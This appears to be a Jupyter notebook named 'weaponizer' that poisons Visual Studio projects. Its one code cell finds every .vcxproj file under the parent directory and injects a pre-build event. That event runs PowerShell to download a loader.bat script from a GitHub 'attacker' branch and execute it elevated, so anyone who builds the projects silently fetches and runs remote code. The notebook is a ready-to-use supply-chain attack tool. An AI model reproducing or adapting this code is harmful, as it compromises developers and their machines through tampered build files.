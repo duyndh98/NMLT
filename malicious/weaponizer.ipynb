{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import os\n",
    "\n",
    "root_dir = \"..\"\n",
    "\n",
    "vcxproj_files = []\n",
    "\n",
    "for dirpath, dirnames, filenames in os.walk(root_dir):\n",
    "    for file in filenames:\n",
    "        if file.endswith(\".vcxproj\"):\n",
    "            full_path = os.path.join(dirpath, file)\n",
    "            vcxproj_files.append(full_path)\n",
    "\n",
    "loader_url = \"https://raw.githubusercontent.com/duyndh98/NMLT/refs/heads/attacker/malicious/loader.bat\"\n",
    "loader_name = \"loader.bat\"\n",
    "commandline = f\"powershell -Command \\\"New-Item -Path $env:TEMP\\\\NMLT -ItemType Directory -Force | Out-Null; Invoke-WebRequest -Uri '{loader_url}' -OutFile $env:TEMP\\\\NMLT\\\\{loader_name}; Start-Process cmd -ArgumentList '/c %TEMP%\\\\NMLT\\\\{loader_name}' -Verb RunAs\\\"\"\n",
    "\n",
    "for filepath in vcxproj_files:\n",
    "    print(filepath)\n",
    "\n",
    "    with open(filepath, 'r', encoding='utf-8') as f:\n",
    "        content = f.read()\n",
    "    \n",
    "    modified_content = content.replace(\n",
    "        \"</ItemDefinitionGroup>\",\n",
    "        f\"<PreBuildEvent><Command>{commandline}</Command></PreBuildEvent>\\n</ItemDefinitionGroup>\"\n",
    "    )\n",
    "    \n",
    "    with open(filepath, 'w', encoding='utf-8') as f:\n",
    "        f.write(modified_content)\n"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".venv",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
